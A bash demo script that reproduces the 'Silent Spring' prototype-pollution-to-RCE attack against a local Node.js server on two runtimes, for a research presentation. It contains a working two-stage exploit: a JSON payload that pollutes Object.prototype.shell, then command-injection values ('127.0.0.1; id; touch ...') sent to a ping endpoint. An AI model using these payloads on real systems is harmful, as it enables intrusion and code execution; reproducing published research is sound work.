#!/usr/bin/env bash
#
# run-demo.sh — one-command, Docker-free reproduction of the Silent Spring
# prototype-pollution -> RCE attack. Everything is logged to results/ for the
# presentation.
#
# It runs the identical HTTP exploit against the SAME app on two runtimes:
#   * Node 16.13.1  (the paper's version)  -> expected: RCE works
#   * System Node   (whatever you have)     -> expected: mitigated
#
# Usage:
#   ./scripts/run-demo.sh
#   ./scripts/run-demo.sh --skip-probe   # skip standalone gadget probe
#   ./scripts/run-demo.sh --ports 3116 3124  # custom ports

set -euo pipefail

# ============================================================================
# Configuration
# ============================================================================
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
RESULTS="${ROOT}/results"
VENDOR="${ROOT}/vendor"
TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
DATE_STAMP="$(date '+%Y%m%d_%H%M%S')"

# Default ports
PORT16="${PORT16:-3116}"
PORTSYS="${PORTSYS:-3124}"

# Parse arguments
SKIP_PROBE=false
while [[ $# -gt 0 ]]; do
  case $1 in
    --skip-probe) SKIP_PROBE=true; shift ;;
    --ports) PORT16="$2"; PORTSYS="$3"; shift 3 ;;
    --help) 
      echo "Usage: $0 [--skip-probe] [--ports <port16> <portSys>]"
      exit 0
      ;;
    *) echo "Unknown option: $1"; exit 1 ;;
  esac
done

# ============================================================================
# Locate Node binaries
# ============================================================================
find_node16() {
  local os="$(uname -s | tr '[:upper:]' '[:lower:]')"
  local pattern="${VENDOR}/node-v16.13.1-${os}-*/bin/node"
  ls -d $pattern 2>/dev/null | head -1
}

N16="$(find_node16)"
SYS_NODE="$(command -v node || echo "")"

# ============================================================================
# Setup directories
# ============================================================================
mkdir -p "$RESULTS"

RCE_MARKER="${RESULTS}/RCE_PROOF_${DATE_STAMP}.txt"
export RCE_MARKER  # Make it available to subprocesses
rm -f "$RESULTS"/RCE_PROOF*.txt

# ============================================================================
# Utility functions
# ============================================================================
hr() { printf '%s\n' "────────────────────────────────────────────────────────────"; }
say() { printf '\n\033[1m%s\033[0m\n' "$*"; }
warn() { printf '\n\033[33m⚠️  %s\033[0m\n' "$*" >&2; }
error() { printf '\n\033[31m❌  ERROR: %s\033[0m\n' "$*" >&2; exit 1; }
success() { printf '\n\033[32m✅  %s\033[0m\n' "$*"; }

# JSON field extractor (no jq dependency)
jget() {
  "$SYS_NODE" -e '
    let data = "";
    process.stdin.on("data", chunk => data += chunk);
    process.stdin.on("end", () => {
      try {
        const parsed = JSON.parse(data);
        console.log(parsed[process.argv[1]] ?? "");
      } catch(e) {
        console.log("");
      }
    });
  ' "$1"
}

# ============================================================================
# Check prerequisites
# ============================================================================
check_prerequisites() {
  local missing=false
  
  if [[ -z "$SYS_NODE" ]]; then
    error "Node.js not found in PATH. Please install Node.js."
  fi
  
  if [[ ! -x "$N16" ]]; then
    warn "Node 16.13.1 not found at: $N16"
    warn "Run: ./scripts/setup.sh to download the paper's runtime"
    warn "Proceeding with system Node only..."
    missing=true
  fi
  
  # Check if the server script exists
  if [[ ! -f "${ROOT}/src/server.js" ]]; then
    error "Server script not found: ${ROOT}/src/server.js"
  fi
  
  if [[ ! -f "${ROOT}/scripts/probe-gadget.js" ]]; then
    warn "Gadget probe script not found: ${ROOT}/scripts/probe-gadget.js"
  fi
  
  if [[ "$missing" == true ]]; then
    warn "Some features will be skipped."
  fi
}

# ============================================================================
# Wait for server to be ready
# ============================================================================
wait_for_server() {
  local port="$1"
  local max_attempts=30
  local attempt=0
  
  while [[ $attempt -lt $max_attempts ]]; do
    if curl -s "http://127.0.0.1:$port/api/status" >/dev/null 2>&1; then
      return 0
    fi
    sleep 0.2
    ((attempt++))
  done
  
  return 1
}

# ============================================================================
# run_exploit - Full HTTP exploit against a live server
# ============================================================================
run_exploit() {
  local node_bin="$1"
  local port="$2"
  local label="$3"
  local srv_log="$4"
  local out_file="$5"
  
  local node_ver="$("$node_bin" --version)"
  local base_url="http://127.0.0.1:$port"
  
  say "▶  Starting server ($label) on port $port"
  
  # Start server
  PORT="$port" "$node_bin" "${ROOT}/src/server.js" >"$srv_log" 2>&1 &
  local server_pid=$!
  
  # Wait for server
  if ! wait_for_server "$port"; then
    kill "$server_pid" 2>/dev/null || true
    error "Server failed to start on port $port (see $srv_log)"
  fi
  
  success "Server ready (PID: $server_pid)"
  
  # Run the exploit and capture output
  {
    echo "# Silent Spring Exploit — $label ($node_ver)"
    echo "# Generated: $TIMESTAMP"
    echo "# URL: $base_url"
    echo
    
    echo "## Step 1 — Baseline status"
    curl -s "$base_url/api/status"
    echo
    
    echo
    echo "## Step 2 — Command injection WITHOUT pollution (expected: SAFE)"
    echo "→ GET /api/ping?host=127.0.0.1; id"
    local r2
    r2="$(curl -s "$base_url/api/ping?host=127.0.0.1;%20id")"
    echo "$r2"
    echo
    
    echo
    echo "## Step 3 — Stage 1: Pollute Object.prototype via /api/settings"
    echo "→ POST /api/settings  {\"constructor\":{\"prototype\":{\"shell\":true}}}"
    curl -s -X POST -H 'Content-Type: application/json' \
      -d '{"constructor":{"prototype":{"shell":true}}}' "$base_url/api/settings"
    echo
    echo "→ Status after pollution:"
    curl -s "$base_url/api/status"
    echo
    
    echo
    echo "## Step 4 — Stage 2: Trigger gadget with command injection"
    local inj="127.0.0.1; id; touch '$RCE_MARKER'"
    local enc
    enc="$("$SYS_NODE" -e 'console.log(encodeURIComponent(process.argv[1]))' "$inj")"
    echo "→ GET /api/ping?host=$inj"
    curl -s "$base_url/api/ping?host=$enc"
    echo
  } | tee "$out_file"
  
  # Clean up server
  kill "$server_pid" 2>/dev/null || true
  wait "$server_pid" 2>/dev/null || true
  
  # Determine verdict
  if grep -q "uid=" "$out_file"; then
    echo "VULNERABLE"
  else
    echo "MITIGATED"
  fi
}

# ============================================================================
# Main execution
# ============================================================================
main() {
  echo
  hr
  say "🔬 Silent Spring — Prototype Pollution → RCE  |  Automated Demo"
  echo "   $TIMESTAMP"
  hr
  
  check_prerequisites
  
  echo
  echo "📦 Runtime information:"
  echo "   System Node : $("$SYS_NODE" --version)  ($SYS_NODE)"
  if [[ -x "$N16" ]]; then
    echo "   Paper  Node : $("$N16" --version)  (local vendor copy)"
  else
    echo "   Paper  Node : ⚠️  NOT FOUND (run ./scripts/setup.sh)"
  fi
  hr
  
  # ===== Part A: Gadget probe =====
  if [[ "$SKIP_PROBE" == false ]]; then
    say "[A] Universal gadget probe (standalone, no HTTP)"
    
    if [[ -x "$N16" ]] && [[ -f "${ROOT}/scripts/probe-gadget.js" ]]; then
      echo "   ▶  Node 16.13.1:"
      "$N16" "${ROOT}/scripts/probe-gadget.js" | tee "${RESULTS}/probe-node16.txt" | tail -6
    fi
    
    if [[ -f "${ROOT}/scripts/probe-gadget.js" ]]; then
      echo
      echo "   ▶  System Node:"
      "$SYS_NODE" "${ROOT}/scripts/probe-gadget.js" | tee "${RESULTS}/probe-system.txt" | tail -6
    fi
    
    hr
  fi
  
  # ===== Part B: Full exploit on Node 16 =====
  local verdict16="n/a"
  if [[ -x "$N16" ]]; then
    say "[B] Full HTTP exploit — Node 16.13.1 (paper's version)"
    hr
    verdict16="$(run_exploit "$N16" "$PORT16" "Node 16.13.1" \
      "${RESULTS}/server-node16.log" \
      "${RESULTS}/exploit-node16.txt" | tail -1)"
    success "Node 16 verdict: $verdict16"
  else
    warn "Skipping Node 16 exploit (binary not found)"
  fi
  
  # ===== Part C: Full exploit on system Node =====
  say "[C] Full HTTP exploit — System Node ($("$SYS_NODE" --version))"
  hr
  verdict_sys="$(run_exploit "$SYS_NODE" "$PORTSYS" "System Node" \
    "${RESULTS}/server-system.log" \
    "${RESULTS}/exploit-system.txt" | tail -1)"
  success "System Node verdict: $verdict_sys"
  
  # ===== Summary =====
  hr
  say "📊 Summary"
  hr
  
  local rce_proof_status="absent"
  if ls "$RESULTS"/RCE_PROOF*.txt >/dev/null 2>&1; then
    rce_proof_status="present ✅"
  fi
  
  echo
  echo "   ┌───────────────────────┬──────────────────────┐"
  echo "   │ Runtime               │ End-to-End RCE       │"
  echo "   ├───────────────────────┼──────────────────────┤"
  if [[ -x "$N16" ]]; then
    printf "   │ Node 16.13.1 (paper)  │ %-20s │\n" "$verdict16"
  else
    printf "   │ Node 16.13.1 (paper)  │ %-20s │\n" "n/a (not found)"
  fi
  printf "   │ System Node %-9s │ %-20s │\n" "$("$SYS_NODE" --version)" "$verdict_sys"
  echo "   └───────────────────────┴──────────────────────┘"
  echo
  echo "   📄 RCE proof marker: $rce_proof_status"
  echo "   📁 Logs saved to: $RESULTS/"
  
  # Generate summary markdown
  generate_summary "$verdict16" "$verdict_sys"
  
  echo
  hr
  echo "   📄 Full summary: ${RESULTS}/SUMMARY.md"
  hr
  echo
}

# ============================================================================
# Generate summary markdown
# ============================================================================
generate_summary() {
  local v16="${1:-n/a}"
  local vsys="$2"
  local probe_status16="n/a"
  local probe_statussys="MITIGATED"
  
  if [[ -f "${RESULTS}/probe-system.txt" ]] && grep -q '"verdict":"VULNERABLE"' "${RESULTS}/probe-system.txt" 2>/dev/null; then
    probe_statussys="VULNERABLE"
  fi
  if [[ -f "${RESULTS}/probe-node16.txt" ]] && grep -q '"verdict":"VULNERABLE"' "${RESULTS}/probe-node16.txt" 2>/dev/null; then
    probe_status16="VULNERABLE"
  fi
  
  local proof_status="absent"
  if ls "$RESULTS"/RCE_PROOF*.txt >/dev/null 2>&1; then
    proof_status="present ✅"
  fi

  cat > "${RESULTS}/SUMMARY.md" <<EOF
# Silent Spring Demo — Run Summary

- **Generated**: $TIMESTAMP
- **Paper**: *Silent Spring: Prototype Pollution Leads to RCE in Node.js*, USENIX Security 2023
- **Attack**: Stage 1 prototype pollution (lodash \`defaultsDeep\`, v4.17.11) → Stage 2 universal gadget (\`child_process.spawn\` reading inherited \`shell\`)

## Result Matrix

| Runtime | Universal Gadget (Probe) | End-to-End HTTP RCE |
|---------|--------------------------|---------------------|
| Node 16.13.1 (paper) | **$probe_status16** | **$v16** |
| System Node $("$SYS_NODE" --version) | **$probe_statussys** | **$vsys** |

## Proof of RCE

- **Marker file**: $proof_status
- **Location**: \`$RESULTS/RCE_PROOF_${DATE_STAMP}.txt\`

## Artifacts

| File | Contents |
|------|----------|
| \`probe-node16.txt\` / \`probe-system.txt\` | Standalone gadget probe output |
| \`exploit-node16.txt\` / \`exploit-system.txt\` | Full 4-step HTTP attack transcript |
| \`server-node16.log\` / \`server-system.log\` | Server-side console logs |
| \`RCE_PROOF_*.txt\` | File created by injected command; proves RCE |

## Key Takeaways

1. Passing user data to \`spawn\` as an **argv array is normally safe** — no shell, no injection.
2. A single prototype-pollution write (\`Object.prototype.shell = true\`) **silently re-enables** shell interpretation inside Node's own \`child_process\` internals → command injection ("universal gadget").
3. The **injection sink and the gadget live in different, individually-reasonable code** — hard to spot, requiring whole-program taint analysis.
4. Newer Node runtimes hardened the internal gadget (null-prototype default options), so the *same* exploit is **mitigated** on modern Node — a concrete argument for keeping runtimes patched.

## Reproducibility

\`\`\`bash
# Run the demo
./scripts/run-demo.sh

# Skip the standalone probe
./scripts/run-demo.sh --skip-probe

# Use custom ports
./scripts/run-demo.sh --ports 3116 3124
\`\`\`
EOF
}

# ============================================================================
# Run main
# ============================================================================
main "$@"